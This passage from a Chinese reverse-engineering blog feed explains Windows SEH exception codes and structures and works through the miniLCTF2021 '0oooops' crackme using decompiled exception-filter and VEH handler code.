class="number">16</span>]</span><br><span class="line">key = [<span class="number">96</span>,<span class="number">102</span>,<span class="number">38</span>,<span class="number">45</span>,<span class="number">76</span>,<span class="number">99</span>,<span class="number">120</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(val)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(val[i]^key[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong><code>id3*ndh</code></strong></p>]]></content>
      
      
      <categories>
          
          <category> ReverseEngineering </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SEH</title>
      <link href="/SEH/"/>
      <url>/SEH/</url>
      
        <content type="html"><![CDATA[<p>记录一些SEH相关的reverse题目&#x2F;知识点</p><span id="more"></span><p><a href="https://www.yunzh1jun.com/2022/05/27/WindowsSEH/" target="_blank">这篇</a>写的挺好的<br>最近做了好些异常相关的题目 有必要总结以下知识点</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="异常值"><a href="#异常值" class="headerlink" title="异常值"></a>异常值</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_ACCESS_VIOLATION         <span class="number">0xC0000005</span>     </span><br><span class="line">程序企图读写一个不可访问的地址时引发的异常。例如企图读取<span class="number">0</span>地址处的内存。</span><br><span class="line">EXCEPTION_ARRAY_BOUNDS_EXCEEDED    <span class="number">0xC000008C</span>     </span><br><span class="line">数组访问越界时引发的异常。</span><br><span class="line">EXCEPTION_BREAKPOINT               <span class="number">0x80000003</span>     </span><br><span class="line">触发断点时引发的异常。</span><br><span class="line">EXCEPTION_DATATYPE_MISALIGNMENT    <span class="number">0x80000002</span>     </span><br><span class="line">程序读取一个未经对齐的数据时引发的异常。</span><br><span class="line">EXCEPTION_FLT_DENORMAL_OPERAND     <span class="number">0xC000008D</span>     </span><br><span class="line">如果浮点数操作的操作数是非正常的，则引发该异常。所谓非正常，即它的值太小以至于不能用标准格式表示出来。</span><br><span class="line">EXCEPTION_FLT_DIVIDE_BY_ZERO       <span class="number">0xC000008E</span>     </span><br><span class="line">浮点数除法的除数是<span class="number">0</span>时引发该异常。</span><br><span class="line">EXCEPTION_FLT_INEXACT_RESULT       <span class="number">0xC000008F</span>     </span><br><span class="line">浮点数操作的结果不能精确表示成小数时引发该异常。</span><br><span class="line">EXCEPTION_FLT_INVALID_OPERATION    <span class="number">0xC0000090</span>     </span><br><span class="line">该异常表示不包括在这个表内的其它浮点数异常。</span><br><span class="line">EXCEPTION_FLT_OVERFLOW             <span class="number">0xC0000091</span>     </span><br><span class="line">浮点数的指数超过所能表示的最大值时引发该异常。</span><br><span class="line">EXCEPTION_FLT_STACK_CHECK          <span class="number">0xC0000092</span>     </span><br><span class="line">进行浮点数运算时栈发生溢出或下溢时引发该异常。</span><br><span class="line">EXCEPTION_FLT_UNDERFLOW            <span class="number">0xC0000093</span>     </span><br><span class="line">浮点数的指数小于所能表示的最小值时引发该异常。</span><br><span class="line">EXCEPTION_ILLEGAL_INSTRUCTION      <span class="number">0xC000001D</span>     </span><br><span class="line">程序企图执行一个无效的指令时引发该异常。</span><br><span class="line">EXCEPTION_IN_PAGE_ERROR            <span class="number">0xC0000006</span>     </span><br><span class="line">程序要访问的内存页不在物理内存中时引发的异常。</span><br><span class="line">EXCEPTION_INT_DIVIDE_BY_ZERO       <span class="number">0xC0000094</span>     </span><br><span class="line">整数除法的除数是<span class="number">0</span>时引发该异常。</span><br><span class="line">EXCEPTION_INT_OVERFLOW             <span class="number">0xC0000095</span>     </span><br><span class="line">整数操作的结果溢出时引发该异常。</span><br><span class="line">EXCEPTION_INVALID_DISPOSITION      <span class="number">0xC0000026</span>     </span><br><span class="line">异常处理器返回一个无效的处理的时引发该异常。</span><br><span class="line">EXCEPTION_NONCONTINUABLE_EXCEPTION <span class="number">0xC0000025</span>     </span><br><span class="line">发生一个不可继续执行的异常时，如果程序继续执行，则会引发该异常。</span><br><span class="line">EXCEPTION_PRIV_INSTRUCTION         <span class="number">0xC0000096</span>     </span><br><span class="line">程序企图执行一条当前CPU模式不允许的指令时引发该异常。</span><br><span class="line">EXCEPTION_SINGLE_STEP              <span class="number">0x80000004</span>     </span><br><span class="line">标志寄存器的TF位为<span class="number">1</span>时，每执行一条指令就会引发该异常。主要用于单步调试。</span><br><span class="line">EXCEPTION_STACK_OVERFLOW           <span class="number">0xC00000FD</span>     </span><br><span class="line">栈溢出时引发该异常。</span><br></pre></td></tr></table></figure><h2 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> *Next;</span><br><span class="line">    <span class="comment">//指向下一个 EXCEPTION_REGISTRATION_RECORD</span></span><br><span class="line"></span><br><span class="line">    PEXCEPTION_DISPOSITION Handler;  </span><br><span class="line">    <span class="comment">//指向异常处理函数</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD,*PEXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><h2 id="异常处理函数"><a href="#异常处理函数" class="headerlink" title="异常处理函数"></a>异常处理函数</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION __cdecl _except_handler</span><br><span class="line">(</span><br><span class="line">  EXCEPTION_RECORD              *pRecord,</span><br><span class="line">  EXCEPTION_REGISTRATION_RECORD *pFrame,</span><br><span class="line">  CONTEXT                       *pContext,</span><br><span class="line">  PVOID                          pValue</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>重点分析第一个和第三个参数</p><h3 id="EXCEPTION-RECORD"><a href="#EXCEPTION-RECORD" class="headerlink" title="EXCEPTION_RECORD"></a>EXCEPTION_RECORD</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_RECORD</span> &#123;</span><br><span class="line">  DWORD                    ExceptionCode;<span class="comment">//异常代码</span></span><br><span class="line">  DWORD                    ExceptionFlags;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_RECORD</span> *ExceptionRecord;</span><br><span class="line">  PVOID                    ExceptionAddress;<span class="comment">//异常发生地址</span></span><br><span class="line">  DWORD                    NumberParameters;</span><br><span class="line">  ULONG_PTR                ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure><h3 id="CONTEXT"><a href="#CONTEXT" class="headerlink" title="CONTEXT"></a>CONTEXT</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CONTEXT</span> &#123;</span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line">    DWORD   Dr0;                <span class="comment">//0x04</span></span><br><span class="line">    DWORD   Dr1;                <span class="comment">//0x08</span></span><br><span class="line">    DWORD   Dr2;                <span class="comment">//0x0c</span></span><br><span class="line">    DWORD   Dr3;                <span class="comment">//0x10</span></span><br><span class="line">    DWORD   Dr6;                <span class="comment">//0x14</span></span><br><span class="line">    DWORD   Dr7;                <span class="comment">//0x18</span></span><br><span class="line"></span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line"></span><br><span class="line">    DWORD   SegGs;              <span class="comment">//0x88</span></span><br><span class="line">    DWORD   SegFs;              <span class="comment">//0x90</span></span><br><span class="line">    DWORD   SegEs;              <span class="comment">//0x94</span></span><br><span class="line">    DWORD   SegDs;              <span class="comment">//0x98</span></span><br><span class="line"></span><br><span class="line">    DWORD   Edi;                <span class="comment">//0x9c</span></span><br><span class="line">    DWORD   Esi;                <span class="comment">//0xa0</span></span><br><span class="line">    DWORD   Ebx;                <span class="comment">//0xa4</span></span><br><span class="line">    DWORD   Edx;                <span class="comment">//0xa8</span></span><br><span class="line">    DWORD   Ecx;                <span class="comment">//0xac</span></span><br><span class="line">    DWORD   Eax;                <span class="comment">//0xb0</span></span><br><span class="line">    DWORD   Ebp;                <span class="comment">//0xb4</span></span><br><span class="line">    DWORD   Eip;                <span class="comment">//0xb8</span></span><br><span class="line"></span><br><span class="line">    DWORD   SegCs;              <span class="comment">//0xbc MUST BE SANITIZED</span></span><br><span class="line">    DWORD   EFlags;             <span class="comment">//0xc0 MUST BE SANITIZED</span></span><br><span class="line">    DWORD   Esp;                <span class="comment">//0xc4</span></span><br><span class="line">    DWORD   SegSs;              <span class="comment">//0xc8</span></span><br><span class="line"></span><br><span class="line">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line">&#125; CONTEXT;</span><br></pre></td></tr></table></figure><p>注意里面的Eip成员(0xb8)<br>一般来说 当一句代码触发异常时 Eip指向这句代码结束的位置(便于处理完异常后能够正常执行后续代码)<br>但是在异常处理函数(Handler)中 可以修改CONTEXT-&gt;Eip!(可以用于反调试)</p><h2 id="结构化异常处理内部函数"><a href="#结构化异常处理内部函数" class="headerlink" title="结构化异常处理内部函数"></a>结构化异常处理内部函数</h2><p>C++提供两个可用于try-except内部的函数</p><ul><li>GetExceptionCode: 返回异常值</li><li>GetExceptionInformation: 返回一个指向EXCEPTION_POINTERS 结构的指针</li></ul><h3 id="EXCEPTION-POINTERS-结构体"><a href="#EXCEPTION-POINTERS-结构体" class="headerlink" title="EXCEPTION_POINTERS 结构体"></a>EXCEPTION_POINTERS 结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_POINTERS</span> &#123;</span><br><span class="line">  PEXCEPTION_RECORD ExceptionRecord;</span><br><span class="line">  PCONTEXT          ContextRecord;</span><br><span class="line">&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;</span><br></pre></td></tr></table></figure><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>要注意！有些异常触发是有条件的(比如将某个变量&gt;&gt;多少位 要移为0后才会触发除零异常(这时一般在Handler里都有对关键变量的操作) )<br>一些小技巧:</p><ul><li>选中变量按Y 输入正确类型让IDA更好识别</li><li>选中某些常量值按M IDA会自动转为宏 (比如 EXCEPTION_ACCESS_VIOLATION) 的形式</li></ul><h2 id="miniLCTF2021-0oooops"><a href="#miniLCTF2021-0oooops" class="headerlink" title="miniLCTF2021 0oooops"></a>miniLCTF2021 0oooops</h2><p>IDA打开</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE v4[<span class="number">108</span>]; <span class="comment">// [esp+E0h] [ebp-F0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">104</span>]; <span class="comment">// [esp+14Ch] [ebp-84h] BYREF</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+1B8h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">j_memset</span>(Str, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;Please input your flag: &quot;</span>);</span><br><span class="line">  <span class="built_in">j_memset</span>(&amp;v4[<span class="number">25</span>], <span class="number">0</span>, <span class="number">0x4B</span>u);</span><br><span class="line">  <span class="built_in">sub_2D10DC</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)v4);</span><br><span class="line">  <span class="built_in">sub_2D1037</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)Str);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">sub_2D12DA</span>(Str) )       <span class="comment">// 检查格式</span></span><br><span class="line">  &#123;</span><br><span class="line">    MEMORY[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_2D126C</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很明显触发了一个内存访问异常</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_ACCESS_VIOLATION         <span class="number">0xC0000005</span></span><br></pre></td></tr></table></figure><p>转到汇编查看 发现除了这个异常外还触发了一个除零异常</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">002</span>D2330 ;   __try &#123; <span class="comment">// __except at loc_2D2377</span></span><br><span class="line">.text:<span class="number">002</span>D2330                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0</span></span><br><span class="line">.text:<span class="number">002</span>D2337                 lea     ebx, [ebp+Str]</span><br><span class="line">.text:<span class="number">002</span>D233D                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">002</span>D233F                 db      <span class="number">3</span>Eh</span><br><span class="line">.text:<span class="number">002</span>D233F                 mov     dword ptr [eax], <span class="number">0</span></span><br><span class="line">.text:<span class="number">002</span>D2346                 mov     edx, <span class="number">0</span></span><br><span class="line">.text:<span class="number">002</span>D234B                 div     edx             ; 除零异常!</span><br><span class="line">.text:<span class="number">002</span>D234B ;   &#125; <span class="comment">// starts at 2D2330</span></span><br><span class="line">.text:<span class="number">002</span>D234D                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh</span><br><span class="line">.text:<span class="number">002</span>D2354                 jmp     <span class="type">short</span> loc_2D2381</span><br></pre></td></tr></table></figure><p>这里先处理的是除零异常(为什么是这个顺序还没弄懂…) 跳转到2D2377</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loc_2D2377:</span><br><span class="line">;   __except(loc_2D2356) <span class="comment">// owned by 2D2330</span></span><br><span class="line">mov     esp, [ebp+ms_exc.old_esp]</span><br><span class="line">mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh</span><br></pre></td></tr></table></figure><p>跟进2D2356</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">loc_2D2356:</span><br><span class="line">;   __except filter <span class="comment">// owned by 2D2330</span></span><br><span class="line">mov     eax, [ebp+ms_exc.exc_ptr]</span><br><span class="line">mov     ecx, [eax]</span><br><span class="line">mov     edx, [ecx]</span><br><span class="line">mov     [ebp+var_1BC], edx</span><br><span class="line">mov     eax, [ebp+ms_exc.exc_ptr]</span><br><span class="line">push    eax</span><br><span class="line">mov     ecx, [ebp+var_1BC]</span><br><span class="line">push    ecx</span><br><span class="line">call    sub_2D1131</span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>查看这个sub_2D1131跟进到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_411DD0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41D015);</span><br><span class="line">  <span class="keyword">if</span> ( **(_DWORD **)a2 != <span class="number">-1073741676</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = *(_DWORD *)(*(_DWORD *)(a2 + <span class="number">4</span>) + <span class="number">164</span>) + <span class="number">9</span>;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v4, <span class="string">&quot;!V -&#125;VG-bp&#125;m-nG!b|ra GyGE|Drp D&quot;</span>, <span class="number">31</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != ((<span class="type">unsigned</span> __int8)*(_DWORD *)(*(_DWORD *)(a2 + <span class="number">4</span>) + <span class="number">184</span>) ^ ((*(<span class="type">char</span> *)(v5 + <span class="number">2</span> * i + <span class="number">1</span>) ^ <span class="number">0x4D</span>) - <span class="number">4</span>) ^ <span class="number">0x13</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(*(_DWORD *)(a2 + <span class="number">4</span>) + <span class="number">184</span>) += <span class="number">54</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)(*(_DWORD *)(a2 + <span class="number">4</span>) + <span class="number">184</span>) += <span class="number">63</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现这里特别乱 主要是因为a2的类型还是DWORD导致IDA没办法准确识别结构<br>通过-1073741676(0xC0000094) 可以知道这是FILTER 那么a2的类型就应该为 _EXCEPTION_POINTERS *a2<br>在IDA选中a2 按Y 改为 _EXCEPTION_POINTERS *a2 修改a2类型 方便程序识别<br>修改a2类型后代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_2D1DD0</span><span class="params">(<span class="type">int</span> a1, _EXCEPTION_POINTERS *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h] BYREF</span></span><br><span class="line">  DWORD v5; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_2DD015);</span><br><span class="line">  <span class="keyword">if</span> ( a2-&gt;ExceptionRecord-&gt;ExceptionCode != <span class="number">0xC0000094</span> )<span class="comment">// EXCEPTION FILTER!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                                   <span class="comment">// 这里把a2类型转换为 _EXCEPTION_POINTERS *a2 方便IDA识别</span></span><br><span class="line">  v5 = a2-&gt;ContextRecord-&gt;Ebx + <span class="number">9</span>;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v4, <span class="string">&quot;!V -&#125;VG-bp&#125;m-nG!b|ra GyGE|Drp D&quot;</span>, <span class="number">31</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != ((<span class="type">unsigned</span> __int8)a2-&gt;ContextRecord-&gt;Eip ^ ((*(<span class="type">char</span> *)(v5 + <span class="number">2</span> * i + <span class="number">1</span>) ^ <span class="number">0x4D</span>) - <span class="number">4</span>) ^ <span class="number">0x13</span>) )<span class="comment">// 奇数字符加密</span></span><br><span class="line">    &#123;                                           <span class="comment">// 这里的Eip指向__try块结束的地址 002D234B 所以取4B(最后一字节)</span></span><br><span class="line">      a2-&gt;ContextRecord-&gt;Eip += <span class="number">54</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  a2-&gt;ContextRecord-&gt;Eip += <span class="number">63</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就清晰多了<br>这个函数对输入字符的奇数位进行了加密 check<br>逆回去需要知道这里 (unsigned __int8)a2-&gt;ContextRecord-&gt;Eip 的值<br>这个值指向的是__try块结束的地址 IDA找到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00412330</span> ;   __try &#123; <span class="comment">// __except at loc_412377</span></span><br><span class="line">.text:<span class="number">00412330</span>                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0</span></span><br><span class="line">.text:<span class="number">00412337</span>                 lea     ebx, [ebp+Str]</span><br><span class="line">.text:<span class="number">0041233</span>D                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">0041233F</span>                 db      <span class="number">3</span>Eh</span><br><span class="line">.text:<span class="number">0041233F</span>                 mov     dword ptr [eax], <span class="number">0</span></span><br><span class="line">.text:<span class="number">00412346</span>                 mov     edx, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0041234B</span>                 div     edx</span><br><span class="line">.text:<span class="number">0041234B</span> ;   &#125; <span class="comment">// starts at 412330</span></span><br></pre></td></tr></table></figure><p>可以看到这里结束位置为 41234B 那么取unsigned int8 就是 4B 所以xor的值为0x4B</p><p>那内存异常呢？？？<br>敏锐的可以发现这里有个TlsCallback_0_0</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID __stdcall <span class="title">TlsCallback_0_0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41D015);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1u</span>, Handler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以通过这个VEH机制(tcl 还不会…) 来处理的这个内存异常<br>查看Handler</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">sub_411BD0</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41D015);</span><br><span class="line">  <span class="keyword">if</span> ( **(_DWORD **)a1 != <span class="number">-1073741819</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = *(_DWORD *)(*(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">164</span>) + <span class="number">9</span>;</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span 